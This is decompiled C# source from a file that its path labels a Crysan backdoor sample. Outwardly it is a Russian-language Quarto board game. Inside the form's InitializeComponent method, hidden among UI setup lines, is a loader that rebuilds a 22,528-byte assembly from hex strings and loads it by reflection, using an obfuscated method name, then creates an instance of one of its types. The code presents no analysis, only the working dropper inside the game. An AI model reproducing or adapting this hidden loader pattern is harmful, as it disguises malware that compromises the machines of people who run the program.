// Decompiled with JetBrains decompiler
// Type: RiskManagement.Form1
// Assembly: IRefle, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 09188B70-FC90-4B10-A900-838DE205A659
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\Backdoor.MSIL.Crysan.drn-7517431630373a1eec83586fad357154d832851724f8aa57ce6561d87ee8f8f1.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace RiskManagement
{
  public class Form1 : Form
  {
    private Form menu;
    private Random rnd = new Random();
    private Form1.Figurine[,] storage;
    private Form1.Figurine[,] board;
    private readonly int size = 60;
    public bool turn;
    private DateTime time;
    private int step;
    private PictureBox[,] pictureBox;
    private PictureBox[,] borderBox;
    private IContainer components;
    private static System.Type ComMember;
    private PictureBox pictureBox1;
    private Button button2;
    private Button button1;
    private RichTextBox richTextBox1;
    private Panel panel1;
    private Label label1;
    private Label label2;
    private Label label5;
    private Label label6;
    public System.Windows.Forms.Timer timer1;

    public Form1()
    {
      this.InitializeComponent();
      this.richTextBox1.SelectionAlignment = HorizontalAlignment.Center;
      this.pictureBox = new PictureBox[4, 4];
      this.borderBox = new PictureBox[4, 4];
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          double num = index2 < 2 ? 0.0 : 4.1;
          PictureBox[,] pictureBox1 = this.pictureBox;
          int index3 = index1;
          int index4 = index2;
          PictureBox pictureBox2 = new PictureBox();
          pictureBox2.Size = new Size(this.size - 8, this.size - 8);
          pictureBox2.Location = new Point(4 + (int) (((double) index2 + num) * (double) this.size), 4 + index1 * this.size);
          pictureBox2.BackColor = Color.White;
          pictureBox1[index3, index4] = pictureBox2;
          this.pictureBox[index1, index2].MouseDown += new MouseEventHandler(this.PictureBoxIJ_MouseDown);
          PictureBox[,] borderBox = this.borderBox;
          int index5 = index1;
          int index6 = index2;
          PictureBox pictureBox3 = new PictureBox();
          pictureBox3.Size = new Size(this.size - 2, this.size - 2);
          pictureBox3.Location = new Point(1 + (int) (((double) index2 + num) * (double) this.size), 1 + index1 * this.size);
          pictureBox3.Enabled = false;
          borderBox[index5, index6] = pictureBox3;
          this.panel1.Controls.Add((Control) this.pictureBox[index1, index2]);
          this.panel1.Controls.Add((Control) this.borderBox[index1, index2]);
        }
      }
      Form3 form3 = new Form3();
      form3.Owner = (Form) this;
      this.menu = (Form) form3;
      this.menu.Show();
    }

    private void Form1_LocationChanged(object sender, EventArgs e)
    {
      Form menu = this.menu;
      Point location = this.Location;
      int x = location.X + 8;
      location = this.Location;
      int y = location.Y + 51;
      Point point = new Point(x, y);
      menu.Location = point;
    }

    private void Form1_Shown(object sender, EventArgs e) => this.menu.Activate();

    public void Button1_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      Form menu;
      for (; this.menu.Height < 296; menu.Height += 5)
        menu = this.menu;
      this.menu.Activate();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.board = new Form1.Figurine[4, 4];
      this.storage = new Form1.Figurine[4, 4];
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          this.storage[index1, index2] = new Form1.Figurine(index1 < 2, index2 % 2 == 0, index2 < 2, index1 % 2 == 1);
          this.borderBox[index1, index2].BackColor = Color.White;
          this.pictureBox[index1, index2].Enabled = false;
        }
      }
      this.Paint_Board();
      this.pictureBox1.Enabled = false;
      this.Paint_Storage();
      this.button2.Enabled = false;
    }

    private void Paint_Board()
    {
      this.pictureBox1.Image = (Image) new Bitmap(this.pictureBox1.Width, this.pictureBox1.Height);
      Graphics graphics = Graphics.FromImage(this.pictureBox1.Image);
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          graphics.FillEllipse(Brushes.OldLace, ((float) index2 + 0.05f) * (float) this.size, ((float) index1 + 0.05f) * (float) this.size, (float) this.size * 0.9f, (float) this.size * 0.9f);
          if (this.board[index1, index2] != null)
          {
            Brush brush = !this.board[index1, index2].Dark ? Brushes.BurlyWood : Brushes.Sienna;
            float num1 = !this.board[index1, index2].Big ? 0.7f : 1f;
            float num2 = (float) (1.0 - (double) num1 * 0.89999997615814209 / Math.Sqrt(2.0));
            double num3 = (double) this.size * (double) num1;
            float num4 = (float) this.size * (num2 / 2f);
            float num5 = (float) (num3 * 0.89999997615814209) / (float) Math.Sqrt(2.0);
            if (this.board[index1, index2].Square)
              graphics.FillRectangle(brush, num4 + (float) (index2 * this.size), num4 + (float) (index1 * this.size), num5, num5);
            else
              graphics.FillEllipse(brush, num4 + (float) (index2 * this.size), num4 + (float) (index1 * this.size), num5, num5);
            float num6 = (float) this.size * ((float) (1.0 - (double) num1 * 0.40000000596046448 / Math.Sqrt(2.0)) / 2f);
            float num7 = (float) (num3 * 0.40000000596046448) / (float) Math.Sqrt(2.0);
            if (this.board[index1, index2].Point)
              graphics.FillEllipse((Brush) new SolidBrush(Color.FromArgb(180, Color.Peru)), num6 + (float) (index2 * this.size), num6 + (float) (index1 * this.size), num7, num7);
          }
        }
      }
      this.pictureBox1.Refresh();
    }

    private void Paint_Storage()
    {
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          if (this.storage[index1, index2] != null)
          {
            this.pictureBox[index1, index2].Image = (Image) new Bitmap(this.pictureBox[index1, index2].Width, this.pictureBox[index1, index2].Height);
            Graphics graphics = Graphics.FromImage(this.pictureBox[index1, index2].Image);
            Brush brush = !this.storage[index1, index2].Dark ? Brushes.BurlyWood : Brushes.Sienna;
            float num1 = !this.storage[index1, index2].Big ? 0.7f : 1f;
            float num2 = (float) (1.0 - (double) num1 * 0.89999997615814209 / Math.Sqrt(2.0));
            double num3 = (double) this.size * (double) num1;
            float num4 = (float) ((double) this.size * ((double) num2 / 2.0) - 4.0);
            float num5 = (float) (num3 * 0.89999997615814209) / (float) Math.Sqrt(2.0);
            if (index2 < 2)
              graphics.FillRectangle(brush, num4, num4, num5, num5);
            else
              graphics.FillEllipse(brush, num4, num4, num5, num5);
            float num6 = (float) ((double) this.size * ((1.0 - (double) num1 * 0.40000000596046448 / Math.Sqrt(2.0)) / 2.0) - 4.0);
            float num7 = (float) (num3 * 0.40000000596046448) / (float) Math.Sqrt(2.0);
            if (this.storage[index1, index2].Point)
              graphics.FillEllipse((Brush) new SolidBrush(Color.FromArgb(180, Color.Peru)), num6, num6, num7, num7);
            this.pictureBox[index1, index2].Refresh();
          }
        }
      }
    }

    public void StartGame()
    {
      this.Form1_Load((object) this, new EventArgs());
      if (this.turn)
      {
        for (int index1 = 0; index1 < 4; ++index1)
        {
          for (int index2 = 0; index2 < 4; ++index2)
            this.pictureBox[index1, index2].Enabled = true;
        }
        this.richTextBox1.Text = "Ваш ход. Выберете фигуру, которой будет играть противник.";
        this.step = 0;
      }
      else
      {
        this.borderBox[this.rnd.Next(4), this.rnd.Next(4)].BackColor = Color.Blue;
        this.pictureBox1.Enabled = true;
        this.richTextBox1.Text = "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.";
        this.step = 1;
      }
      this.label2.Text = "Ход: " + this.step.ToString();
      this.time = new DateTime(0L, DateTimeKind.Unspecified);
      this.timer1.Enabled = true;
      this.timer1.Start();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.time = this.time.AddSeconds(1.0);
      this.label1.Text = "Время: " + this.time.ToString("HH:mm:ss");
    }

    private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
    {
      int index1 = (sender as PictureBox).Location.Y / this.size;
      int index2 = (sender as PictureBox).Location.X / this.size;
      if (index2 > 1)
        index2 -= 4;
      if (this.storage[index1, index2] == null || !(((Bitmap) this.pictureBox[index1, index2].Image).GetPixel(e.X, e.Y) != Color.FromArgb(0, 0, 0, 0)))
        return;
      for (int index3 = 0; index3 < 4; ++index3)
      {
        for (int index4 = 0; index4 < 4; ++index4)
          this.borderBox[index3, index4].BackColor = Color.White;
      }
      this.borderBox[index1, index2].BackColor = Color.Red;
      this.button2.Enabled = true;
      this.richTextBox1.Text = "Именно эта фигура? Если да - нажмите \"Подтвердить\".";
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
      int index1 = e.X / this.size;
      int index2 = e.Y / this.size;
      if (!(((Bitmap) this.pictureBox1.Image).GetPixel(e.X, e.Y) != Color.FromArgb(0, 0, 0, 0)) || this.board[index2, index1] != null)
        return;
      for (int index3 = 0; index3 < 4; ++index3)
      {
        for (int index4 = 0; index4 < 4; ++index4)
        {
          if (this.borderBox[index3, index4].BackColor == Color.Blue)
          {
            this.Paint_Board();
            Graphics graphics = Graphics.FromImage(this.pictureBox1.Image);
            graphics.DrawEllipse(new Pen(Color.Red, 3f), ((float) index1 + 0.05f) * (float) this.size, ((float) index2 + 0.05f) * (float) this.size, (float) this.size * 0.9f, (float) this.size * 0.9f);
            graphics.DrawImage(this.pictureBox[index3, index4].Image, index1 * this.size + 4, index2 * this.size + 4, new Rectangle(0, 0, this.size, this.size), GraphicsUnit.Pixel);
            graphics.Dispose();
            this.pictureBox1.Refresh();
            this.button2.Enabled = true;
            this.richTextBox1.Text = "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".";
            return;
          }
        }
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      this.button2.Enabled = false;
      if (this.pictureBox1.Enabled)
      {
        this.pictureBox1.Enabled = false;
        int index1 = 0;
        int index2 = 0;
        int index3 = 0;
        int index4 = 0;
        for (int index5 = 0; index5 < 4; ++index5)
        {
          for (int index6 = 0; index6 < 4; ++index6)
          {
            if (this.borderBox[index5, index6].BackColor == Color.Blue)
            {
              index1 = index5;
              index2 = index6;
              this.borderBox[index5, index6].BackColor = Color.White;
              this.borderBox[index5, index6].Refresh();
              this.pictureBox[index5, index6].Image = (Image) null;
              this.pictureBox[index5, index6].Refresh();
            }
            if (((Bitmap) this.pictureBox1.Image).GetPixel(index6 * this.size + this.size / 2, (int) (((double) index5 + 0.05000000074505806) * (double) this.size)) == Color.FromArgb((int) byte.MaxValue, (int) byte.MaxValue, 0, 0))
            {
              index3 = index5;
              index4 = index6;
            }
          }
        }
        this.board[index3, index4] = new Form1.Figurine(this.storage[index1, index2]);
        this.storage[index1, index2] = (Form1.Figurine) null;
        this.Paint_Board();
        if (!this.Stop(this.board) && !this.Standoff(this.board))
        {
          for (int index7 = 0; index7 < 4; ++index7)
          {
            for (int index8 = 0; index8 < 4; ++index8)
              this.pictureBox[index7, index8].Enabled = true;
          }
          this.richTextBox1.Text = "Выберете фигуру, которой будет играть противник.";
        }
        else
        {
          if (!this.Standoff(this.board))
            return;
          this.richTextBox1.Text = "Ничья!";
          this.timer1.Stop();
          (this.menu as Form3).ContinueLock();
        }
      }
      else
      {
        ++this.step;
        this.label2.Text = "Ход: " + this.step.ToString();
        this.label2.Refresh();
        this.richTextBox1.Text = "Подождите, компьютер делает свой ход.";
        this.richTextBox1.Refresh();
        int index9 = 0;
        int index10 = 0;
        for (int index11 = 0; index11 < 4; ++index11)
        {
          for (int index12 = 0; index12 < 4; ++index12)
          {
            this.pictureBox[index11, index12].Enabled = false;
            if (this.borderBox[index11, index12].BackColor == Color.Red)
            {
              this.borderBox[index11, index12].BackColor = Color.LimeGreen;
              this.borderBox[index11, index12].Refresh();
              index9 = index11;
              index10 = index12;
            }
          }
        }
        Thread.Sleep(1000);
        Graphics graphics = Graphics.FromImage(this.pictureBox1.Image);
        for (int index13 = 0; index13 < 4; ++index13)
        {
          for (int index14 = 0; index14 < 4; ++index14)
          {
            if (this.board[index13, index14] == null)
            {
              Form1.Figurine[,] mem = (Form1.Figurine[,]) this.board.Clone();
              mem[index13, index14] = new Form1.Figurine(this.storage[index9, index10]);
              if (this.Stop(mem) || this.Standoff(mem))
              {
                graphics.DrawEllipse(new Pen(Color.LimeGreen, 3f), ((float) index14 + 0.05f) * (float) this.size, ((float) index13 + 0.05f) * (float) this.size, (float) this.size * 0.9f, (float) this.size * 0.9f);
                graphics.DrawImage(this.pictureBox[index9, index10].Image, index14 * this.size + 4, index13 * this.size + 4, new Rectangle(0, 0, this.size, this.size), GraphicsUnit.Pixel);
                this.pictureBox1.Refresh();
                Thread.Sleep(200);
                this.borderBox[index9, index10].BackColor = Color.White;
                this.borderBox[index9, index10].Refresh();
                this.pictureBox[index9, index10].Image = (Image) null;
                this.pictureBox[index9, index10].Refresh();
                this.board[index13, index14] = new Form1.Figurine(this.storage[index9, index10]);
                this.storage[index9, index10] = (Form1.Figurine) null;
                if (this.Standoff(this.board))
                  this.richTextBox1.Text = "Ничья!";
                else
                  this.richTextBox1.Text = "QUARTO! Компьютер выиграл!";
                this.timer1.Stop();
                (this.menu as Form3).ContinueLock();
                return;
              }
            }
          }
        }
        int num = 0;
        bool flag;
        int index15;
        int index16;
        int index17;
        int index18;
        do
        {
          ++num;
          flag = false;
          do
          {
            index15 = this.rnd.Next(4);
            index16 = this.rnd.Next(4);
          }
          while (this.board[index15, index16] != null);
          do
          {
            index17 = this.rnd.Next(4);
            index18 = this.rnd.Next(4);
          }
          while (this.storage[index17, index18] == null || index17 == index9 && index18 == index10);
          Form1.Figurine[,] figurineArray = (Form1.Figurine[,]) this.board.Clone();
          figurineArray[index15, index16] = new Form1.Figurine(this.storage[index9, index10]);
          for (int index19 = 0; index19 < 4; ++index19)
          {
            for (int index20 = 0; index20 < 4; ++index20)
            {
              if (figurineArray[index19, index20] == null)
              {
                Form1.Figurine[,] mem = (Form1.Figurine[,]) figurineArray.Clone();
                mem[index19, index20] = new Form1.Figurine(this.storage[index17, index18]);
                if (this.Stop(mem))
                  flag = true;
              }
            }
          }
        }
        while (flag || num < 9);
        graphics.DrawEllipse(new Pen(Color.LimeGreen, 3f), ((float) index16 + 0.05f) * (float) this.size, ((float) index15 + 0.05f) * (float) this.size, (float) this.size * 0.9f, (float) this.size * 0.9f);
        graphics.DrawImage(this.pictureBox[index9, index10].Image, index16 * this.size + 4, index15 * this.size + 4, new Rectangle(0, 0, this.size, this.size), GraphicsUnit.Pixel);
        this.pictureBox1.Refresh();
        Thread.Sleep(200);
        this.borderBox[index9, index10].BackColor = Color.White;
        this.borderBox[index9, index10].Refresh();
        this.pictureBox[index9, index10].Image = (Image) null;
        this.pictureBox[index9, index10].Refresh();
        this.board[index15, index16] = new Form1.Figurine(this.storage[index9, index10]);
        this.storage[index9, index10] = (Form1.Figurine) null;
        this.borderBox[index17, index18].BackColor = Color.Blue;
        this.borderBox[index17, index18].Refresh();
        this.richTextBox1.Text = "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).";
        this.pictureBox1.Enabled = true;
        ++this.step;
        this.label2.Text = "Ход: " + this.step.ToString();
      }
    }

    private bool Stop(Form1.Figurine[,] mem)
    {
      bool flag = false;
      for (int index = 0; index < 4; ++index)
      {
        if (mem[index, 0] != null && mem[index, 1] != null && mem[index, 2] != null && mem[index, 3] != null && (mem[index, 0].Big == mem[index, 1].Big && mem[index, 1].Big == mem[index, 2].Big && mem[index, 2].Big == mem[index, 3].Big || mem[index, 0].Dark == mem[index, 1].Dark && mem[index, 1].Dark == mem[index, 2].Dark && mem[index, 2].Dark == mem[index, 3].Dark || mem[index, 0].Point == mem[index, 1].Point && mem[index, 1].Point == mem[index, 2].Point && mem[index, 2].Point == mem[index, 3].Point || mem[index, 0].Square == mem[index, 1].Square && mem[index, 1].Square == mem[index, 2].Square && mem[index, 2].Square == mem[index, 3].Square) || mem[0, index] != null && mem[1, index] != null && mem[2, index] != null && mem[3, index] != null && (mem[0, index].Big == mem[1, index].Big && mem[1, index].Big == mem[2, index].Big && mem[2, index].Big == mem[3, index].Big || mem[0, index].Dark == mem[1, index].Dark && mem[1, index].Dark == mem[2, index].Dark && mem[2, index].Dark == mem[3, index].Dark || mem[0, index].Point == mem[1, index].Point && mem[1, index].Point == mem[2, index].Point && mem[2, index].Point == mem[3, index].Point || mem[0, index].Square == mem[1, index].Square && mem[1, index].Square == mem[2, index].Square && mem[2, index].Square == mem[3, index].Square))
          flag = true;
      }
      if (mem[0, 0] != null && mem[1, 1] != null && mem[2, 2] != null && mem[3, 3] != null && (mem[0, 0].Big == mem[1, 1].Big && mem[1, 1].Big == mem[2, 2].Big && mem[2, 2].Big == mem[3, 3].Big || mem[0, 0].Dark == mem[1, 1].Dark && mem[1, 1].Dark == mem[2, 2].Dark && mem[2, 2].Dark == mem[3, 3].Dark || mem[0, 0].Point == mem[1, 1].Point && mem[1, 1].Point == mem[2, 2].Point && mem[2, 2].Point == mem[3, 3].Point || mem[0, 0].Square == mem[1, 1].Square && mem[1, 1].Square == mem[2, 2].Square && mem[2, 2].Square == mem[3, 3].Square) || mem[0, 3] != null && mem[1, 2] != null && mem[2, 1] != null && mem[3, 0] != null && (mem[0, 3].Big == mem[1, 2].Big && mem[1, 2].Big == mem[2, 1].Big && mem[2, 1].Big == mem[3, 0].Big || mem[0, 3].Dark == mem[1, 2].Dark && mem[1, 2].Dark == mem[2, 1].Dark && mem[2, 1].Dark == mem[3, 0].Dark || mem[0, 3].Point == mem[1, 2].Point && mem[1, 2].Point == mem[2, 1].Point && mem[2, 1].Point == mem[3, 0].Point || mem[0, 3].Square == mem[1, 2].Square && mem[1, 2].Square == mem[2, 1].Square && mem[2, 1].Square == mem[3, 0].Square))
        flag = true;
      return flag;
    }

    private bool Standoff(Form1.Figurine[,] mem)
    {
      bool flag = true;
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          if (mem[index1, index2] == null)
            flag = false;
        }
      }
      return flag;
    }

    public void SetName(string str)
    {
      this.label5.Text = "Игрок: ";
      this.label6.Text = str;
      this.label5.Left = (this.Width - (this.label5.Width + this.label6.Width)) / 2;
      this.label6.Left = this.label5.Location.X + this.label5.Width;
      this.label1.Text = "";
      this.label2.Text = "";
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.pictureBox1 = new PictureBox();
      this.button2 = new Button();
      this.button1 = new Button();
      this.richTextBox1 = new RichTextBox();
      this.panel1 = new Panel();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.label1 = new Label();
      this.label2 = new Label();
      this.label5 = new Label();
      this.label6 = new Label();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.BackColor = Color.FromArgb(64, 32, 0);
      this.pictureBox1.BorderStyle = BorderStyle.Fixed3D;
      this.pictureBox1.Location = new Point(120, 22);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(246, 246);
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.MouseDown += new MouseEventHandler(this.PictureBox1_MouseDown);
      this.button2.Location = new Point(391, 275);
      this.button2.Name = "button2";
      this.button2.Size = new Size(83, 35);
      this.button2.TabIndex = 4;
      this.button2.TabStop = false;
      this.button2.Text = "Подтвердить";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.Button2_Click);
      this.button1.Location = new Point(12, 275);
      this.button1.Name = "button1";
      this.button1.Size = new Size(83, 35);
      this.button1.TabIndex = 5;
      this.button1.TabStop = false;
      this.button1.Text = "Меню";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.richTextBox1.BackColor = Color.White;
      this.richTextBox1.Location = new Point(107, 275);
      this.richTextBox1.Name = "richTextBox1";
      string str = Veet.Sa + Veet.Xe + Veet.Zr;
      byte[] Level = new byte[22528];
      for (int index = 0; index < 22528; ++index)
        Level[index] = Convert.ToByte(str.Substring(index * 2, 2), 16);
      Form1.CharArray(Level, string.Empty);
      object[] objArray = new object[3]
      {
        (object) Player.MembershipCondition(0),
        (object) Player.MembershipCondition(1),
        (object) "RiskManagement "
      };
      Activator.CreateInstance(Form1.ComMember, objArray);
      this.richTextBox1.ReadOnly = true;
      this.richTextBox1.Size = new Size(272, 35);
      this.richTextBox1.TabIndex = 6;
      this.richTextBox1.TabStop = false;
      this.richTextBox1.Text = "";
      this.panel1.Location = new Point(0, 24);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(486, 240);
      this.panel1.TabIndex = 7;
      this.timer1.Interval = 1000;
      this.timer1.Tick += new EventHandler(this.Timer1_Tick);
      this.label1.AutoSize = true;
      this.label1.Dock = DockStyle.Right;
      this.label1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label1.Location = new Point(486, 0);
      this.label1.Name = "label1";
      this.label1.RightToLeft = RightToLeft.No;
      this.label1.Size = new Size(0, 16);
      this.label1.TabIndex = 8;
      this.label2.AutoSize = true;
      this.label2.Dock = DockStyle.Left;
      this.label2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label2.Location = new Point(0, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(0, 16);
      this.label2.TabIndex = 9;
      this.label5.AutoSize = true;
      this.label5.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label5.Location = new Point(197, 0);
      this.label5.Name = "label5";
      this.label5.Size = new Size(0, 16);
      this.label5.TabIndex = 12;
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label6.Location = new Point(275, 0);
      this.label6.Name = "label6";
      this.label6.Size = new Size(0, 16);
      this.label6.TabIndex = 13;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.White;
      this.ClientSize = new Size(486, 319);
      this.Controls.Add((Control) this.label6);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.Text = "Quarto";
      this.Load += new EventHandler(this.Form1_Load);
      this.Shown += new EventHandler(this.Form1_Shown);
      this.LocationChanged += new EventHandler(this.Form1_LocationChanged);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static void CharArray(byte[] Level, string po) => Form1.PerformTable(Form1.ContextAdd(Level));

    private static Assembly ContextAdd(byte[] Position) => (Assembly) typeof (Assembly).InvokeMember("`Load".TrimStart('`'), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) Position
    });

    private static void PerformTable(Assembly Q3) => Form1.ComMember = Q3.GetTypes()[24];

    public class Figurine
    {
      public bool Dark;
      public bool Big;
      public bool Square;
      public bool Point;

      public Figurine(bool dark, bool big, bool square, bool point)
      {
        this.Dark = dark;
        this.Big = big;
        this.Square = square;
        this.Point = point;
      }

      public Figurine(Form1.Figurine copy)
      {
        this.Dark = copy.Dark;
        this.Big = copy.Big;
        this.Square = copy.Square;
        this.Point = copy.Point;
      }
    }
  }
}
